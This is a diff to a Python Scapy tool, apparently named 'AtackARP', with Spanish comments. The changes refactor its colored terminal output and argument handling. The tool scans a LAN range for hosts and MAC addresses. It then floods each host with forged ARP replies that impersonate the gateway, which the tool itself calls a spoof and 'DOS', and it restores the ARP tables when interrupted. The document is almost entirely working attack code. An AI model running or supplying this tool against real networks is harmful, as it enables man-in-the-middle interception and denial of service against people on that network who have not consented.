@@ -2,14 +2,27 @@
 # -*- coding: utf-8 -*-
 
 __file__ = 'ARP Spoofing'
-__autor__ = 'Dessmon'
+__autor__ = 'Desmon'
 
-from scapy.all import *
-import argparse
-import sys
+from logging import getLogger, ERROR, basicConfig, DEBUG
+
+getLogger("scapy.runtime").setLevel(ERROR) # Que no muestre warning
+basicConfig(level=DEBUG, format='%(threadName)s: %(message)s')
+
+
+from scapy.layers.l2 import ARP, Ether
+from scapy.sendrecv import send, srp
+
+from colorama.ansi      import clear_screen, AnsiCursor
+from colorama           import Fore, Back, init
+
+from argparse           import ArgumentParser
+from sys                import argv, stdout
 import time
 
 from getpass import _raw_input
+
+Cursor = AnsiCursor()
 
 colors = {
     "BLACK": "\033[30m",
@@ -54,44 +67,68 @@ def Carga():
     print("\033]2;=== AtackARP - cargando ===\007")
     print("\033[3J\033[H\033[2J")
 
-    print("\n"+colors["LIGHTWHITE_EX"]+"      ["+colors["LIGHTGREEN_EX"])
+    print(f"\n{Fore.LIGHTGREEN_EX}      [")
     for arch in range(7, 108):
         time.sleep(0.01)
-        print(UP(1)+"\033["+str(arch)+"C"+colors["LIGHTYELLOW_EX"]+"=>")
-        print(UP(1)+colors["LIGHTWHITE_EX"]+str(arch-7)+"%")
-    print(UP(1)+"\033["+str(arch+1)+"C"+colors["LIGHTWHITE_EX"]+"]")
-    print(POS(25, 5) + colors["LIGHTGREEN_EX"] +
-          '\t-------------------------------')
-    print(POS(26, 6) + '\t ' +
-          colors["LIGHTGREEN_EX"] + ">>> Proceso Carga Finalizado")
-    print(POS(25, 7) + '\t-------------------------------\n')
-    #_raw_input("\n\033[1;32mpresione enter para continuar   ")
+        print(f"{Cursor.UP(1)}{Cursor.FORWARD(arch)}{Fore.LIGHTYELLOW_EX}=>")
+        print(f"{Cursor.UP(1)}{Fore.LIGHTWHITE_EX}{str(arch-7)}%")
+    print(f"{Cursor.UP(1)}{Cursor.FORWARD(arch)}{Fore.LIGHTGREEN_EX}]")
+    print(f'{Cursor.POS(25, 5)}{Fore.YELLOW}\t---------------------------------')
+    print(f'{Cursor.POS(26, 6)}{Fore.CYAN  }\t>>> {Fore.LIGHTYELLOW_EX}Proceso Carga Finalizado {Fore.CYAN}<<<')
+    print(f'{Cursor.POS(25, 7)}{Fore.YELLOW}\t---------------------------------{Fore.RESET}')
 
 
-# recibira parametros desde la linea de comandos
-parse = argparse.ArgumentParser()
-# 192.168.1.1/24
-parse.add_argument("-r", "--range", help="Rango a escanear y spoofear")
-parse.add_argument("-g", "--gateway",
-                   help="puerta de enlaze o router")  # 192.168.1.1
-parse = parse.parse_args()  # fin de la instanciazion.
 
+def get_mac(gateway: str) -> str:               # esta fun obtendra la direcion MAC
+    """
+        Esta funcion permite obtener la direccion MAC de un equipo
+        apartir de la direccion IP.
+    Args:
+        gateway (str): Direccion IP a la que enviar el paquete ARP
 
-def get_mac(gateway):  # esta fun obtendra la direcion MAC
-    print("obteniendo la direcion MAC\n")
-    arp_layer = ARP(pdst=gateway)  # pdst es la ip a mandar un paquete ARP
-    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")  # ip por defecto
-    final_packet = broadcast/arp_layer  # esto finalizara la creacion del packete
-    # srp mandara el packete y esperara a recibir uno, srp recibe el packete finalizado, timeout=2 establece 2 segundos de espera, verbose=True activa los mensajes por pantalla del proceso, esta func retornara una lista, la posicion 0 es la mac
-    mac = srp(final_packet, timeout=2, verbose=True)[0]
+    Returns:
+        str: Direccion MAC en tipo string.
+    """
+    print("Obteniendo la direcion MAC\n")
+    
+    # creando una solicitud ARP a la dirección IP
+    arp_layer = ARP(pdst=gateway)               # pdst = ip destino a mandar un paquete ARP
+    
+    # dst  = direccion MAC a enviar el paquete, en este caso la direccion es broadcast
+    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")  
+    
+    # combinando el paquete ARP con el mensaje de difusión
+    final_packet = broadcast/arp_layer          
+    
+    # srp mandara el packete y esperara a recibir uno, srp recibe el packete finalizado, 
+    # timeout=2 establece 2 segundos de espera, verbose=True activa los mensajes por 
+    # pantalla del proceso, esta func retornara una lista, la posicion 0 es la mac
+    mac = srp(final_packet, timeout=2, verbose=True)[0] # se accede solo al result
+    
+    print("\n")
     mac.rawhexdump()
-    print("\n\tdatos recividos: " + str(mac)+"\t\n")
-    #mac = mac[0][1].hwsrc
-    return mac
+    print("\n")
+    mac.show()
+    print("\ndatos recibidos: " + str(mac[0])+"\t\n")
+    return mac[0][1].hwsrc # retornar la direccion MAX
+
+cantidad = 0
+
+def print_list_hosts(gateway, lista_hosts):
+    cantidad = 0
+    print(clear_screen()+Cursor.POS(0,0))
+    for ip_mac in lista_hosts:
+        if ip_mac[0] != gateway:
+            cantidad += 1
+            spaces = (15-len(ip_mac[0])) * " "
+            print(f"{Fore.LIGHTWHITE_EX}[{Fore.CYAN}{cantidad}{Fore.LIGHTWHITE_EX}] ", end="")
+            print(f"{Fore.LIGHTYELLOW_EX}HOST{Fore.LIGHTWHITE_EX}: ", end="")
+            new_lines = cantidad * '\n'
+            print(f"{Fore.LIGHTYELLOW_EX}{ip_mac[0]} {spaces} {Fore.LIGHTMAGENTA_EX}MAC{Fore.LIGHTWHITE_EX}: {Fore.LIGHTMAGENTA_EX}{ip_mac[1]}{Fore.RESET}{new_lines}")
 
 
 def scann_net(rango, gateway):  # este escaneara toda la red.
-    print("conezando el escaneo\n")
+    print("Conezando el escaneo\n")
     lista_hosts = list()
     # esto crearia un packete que se enviaria a toda la red
     arp_layer = ARP(pdst=rango)
@@ -104,31 +141,33 @@ def scann_net(rango, gateway):  # este escaneara toda la red.
     for a in answers:
         if a != gateway:
             cantidad += 1
-            print(
-                "{}[{}+{}] {} HOST:{} \t MAC:{}".format(
-                    colors["LIGHTWHITE_EX"], colors["LIGHTGREEN_EX"], colors["LIGHTWHITE_EX"], cantidad, a[1].psrc, a[1].hwsrc)
-            )
+            spaces = (15-len(a[1].psrc)) * " "
+            print(f"{Fore.LIGHTWHITE_EX}[{Fore.CYAN}{cantidad}{Fore.LIGHTWHITE_EX}] ", end="")
+            print(f"{Fore.LIGHTYELLOW_EX}HOST{Fore.LIGHTWHITE_EX}: ", end="")
+            print(f"{Fore.LIGHTYELLOW_EX}{a[1].psrc} {spaces} {Fore.LIGHTMAGENTA_EX}MAC{Fore.LIGHTWHITE_EX}: {Fore.LIGHTMAGENTA_EX}{a[1].hwsrc}{Fore.RESET}")
             lista_hosts.append([a[1].psrc, a[1].hwsrc])
 
-    delete = _raw_input("\n{}[{}*{}] Desea eliminar alguna direcion IP/MAC (Y/N)?: ".format(
-        colors["LIGHTWHITE_EX"], colors["LIGHTGREEN_EX"], colors["LIGHTWHITE_EX"]))
-    print()
+    delete = _raw_input(f"\n{Fore.LIGHTWHITE_EX}[{Fore.LIGHTGREEN_EX}*{Fore.LIGHTWHITE_EX}]{Fore.RESET} Desea eliminar alguna direcion IP/MAC ({Fore.LIGHTGREEN_EX}Y{Fore.RESET}/{Fore.LIGHTRED_EX}N{Fore.RESET})?: ")
     if delete.upper() == "Y":
         while True:
-            delete = _raw_input("\033[1A{}[{}*{}] Introduce el numero de la ip a eliminar, para salir del bucle introduzca 0: ".format(
-                colors["LIGHTWHITE_EX"], colors["LIGHTBLUE_EX"], colors["LIGHTWHITE_EX"]))
-            if int(delete) > cantidad:
-                print("{}[{}+{}]este numero no esta registrado: "+str(delete)+"".format(
-                    colors["LIGHTWHITE_EX"], colors["LIGHTRED_EX"], colors["LIGHTWHITE_EX"]))
-                pass
-            elif int(delete) == 0:
-                break
-            else:
-                print("\033[1B"+80*" ")
-                print("\033[1ASe elimino correctamente: {}\033[1A\033[1A".format(
-                    lista_hosts[int(delete)-1]))
-                lista_hosts[int(delete)-1] = ''
-                pass
+            try:
+                delete = _raw_input(f"\033[1A{Fore.LIGHTWHITE_EX}[{Fore.LIGHTBLUE_EX}*{Fore.LIGHTWHITE_EX}] Introduce el numero de la ip a eliminar, para salir del bucle introduzca 0: ")
+                if int(delete) > cantidad:
+                    print("{}[{}+{}]este numero no esta registrado: "+str(delete)+"".format(
+                        colors["LIGHTWHITE_EX"], colors["LIGHTRED_EX"], colors["LIGHTWHITE_EX"]))
+                    pass
+                elif int(delete) == 0:
+                    break
+                else:
+                    print("\033[1B"+80*" ")
+                    print("\033[1ASe elimino correctamente: {}\033[1A\033[1A".format(
+                        lista_hosts[int(delete)-1]))
+                    lista_hosts.pop(int(delete)-1)
+                    print_list_hosts(gateway, lista_hosts)
+                    pass
+            except ValueError:
+                print(f"{AnsiCursor.UP(2)}{Fore.LIGHTRED_EX}[{Fore.LIGHTYELLOW_EX}!{Fore.LIGHTRED_EX}]{Fore.LIGHTYELLOW_EX} No es un valor decimal valido{80*' '}", end=f"{Fore.RESET}\n")
+                time.sleep(2)
         for i in range(2):
             print("\033[1B"+80*" ")
         print(6*"\033[1A")
@@ -160,25 +199,53 @@ def restore_arp(destip, sourceip, hwsrc, hwdst):
     # destip=ip destino, psrc=ip origen, hwsrc=direcion MAC origen
     packet = ARP(op=2, pdst=destip, hwdst=dest_mac,
                  psrc=sourceip, hwsrc=source_mac)
-# packet[0].rawhexdump()
+    # packet[0].rawhexdump()
     send(packet, verbose=True)  # envio del packete sin esperar respuesta
     return 1
 
 
-# func que spoofeara a la red, mandando un packete hacindose pasar por otroa ip, ejemplo la del router
-def arp_spoofing(hwdst, pdst, psrc):
+def arp_spoofing(hwdst: str, pdst: str, psrc: str):
+    """
+        Aquí, el paquete ARP se configura como respuesta y
+        pdst se configura como la IP de destino,
+        ya sea para la víctima o el enrutador. hwdst
+        es la dirección MAC de la IP proporcionada
+        y psrc es la dirección IP de suplantación
+        para manipular el paquete.
+
+    Args:
+        hwdst (str): MAC destino
+        pdst  (str): IP  destino
+        psrc  (str): IP origen
+    """
+    
     spoofer_packet = ARP(op=2, hwdst=hwdst, pdst=pdst, psrc=psrc)
-    try:
-        print("{}".format(spoofer_packet[pdst]))
-        send(spoofer_packet, verbose=True)
-    except StopIteration:
-        print("error")
-    return 1
+    spoofer_packet.show2()
+    spoofer_packet.display()
+    send(spoofer_packet, verbose=True, return_packets=True)
 
 
 def main():
+    init()
+    
+    # recibira parametros desde la linea de comandos
+    parse = ArgumentParser(
+        prog = __doc__,
+                    description = f"""
+                        {Fore.GREEN}Arp Spoof Float DOS.{Fore.RESET}
+                    """,
+                    epilog="""
+                    """
+    )
+    parse.add_argument("-r", "--range",   help=f"{Fore.CYAN}Rango a escanear y spoofear{Fore.RESET}")
+    parse.add_argument("-g", "--gateway", help=f"{Fore.CYAN}puerta de enlaze o router{Fore.RESET}")  # 192.168.1.1
+    
+    if len(argv) != 1: 
+        parse = parse.parse_args()  # fin de la instanciazion.
+        Carga()
+    
     # True si el usuario introducio todo los parametros.
-    if parse.range and parse.gateway:
+    #if parse.range and parse.gateway:
         print("\033]2;=== AtackARP - obteniendo MACs ===\007")
         mac_gateway = get_mac(parse.gateway)
         print("\033]2;=== AtackARP - escaneando ===\007")
@@ -209,7 +276,7 @@ def main():
 
                     print("\033["+str(32+len(hosts)+i)+";1H{}[{}+{}] Subplantando a: {}".format(
                         colors["LIGHTWHITE_EX"], colors["LIGHTGREEN_EX"], colors["LIGHTWHITE_EX"], ip_target))
-                    sys.stdout.flush()
+                    stdout.flush()
 
         except KeyboardInterrupt:
             print("\033]2;=== AtackARP - Restaurando tablas ARP ===\007")
@@ -223,9 +290,9 @@ def main():
             exit(0)
 
     else:
-        print("Falta opciones"+colors["RESET"])
+        parse.print_help()
+        exit(1)
 
 
 if __name__ == "__main__":
-    Carga()
     main()
